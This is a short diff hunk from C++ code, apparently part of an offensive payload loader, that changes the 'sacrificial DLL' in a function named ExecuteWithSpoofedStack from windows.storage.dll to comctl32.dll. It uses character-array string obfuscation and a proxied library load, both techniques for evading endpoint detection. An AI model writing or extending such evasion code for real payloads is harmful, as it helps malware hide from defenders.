@@ -348,7 +348,7 @@ ULONG_PTR StackSpoof::ExecuteWithSpoofedStack(
     _In_ PVOID pPayload,
     _In_ DWORD dwPayloadSize
 ) {
-    WCHAR DllName[] = { L'w',L'i',L'n',L'd',L'o',L'w',L's',L'.',L's',L't',L'o',L'r',L'a',L'g',L'e',L'.',L'd',L'l',L'l',L'\0' };
+    WCHAR DllName[] = { L'c',L'o',L'm',L'c',L't',L'l',L'3',L'2',L'.',L'd',L'l',L'l',L'\0' };
 
     /* Load sacrificial DLL */
     PVOID pModule = Proxy::WorkItemLoadLibrary(DllName);
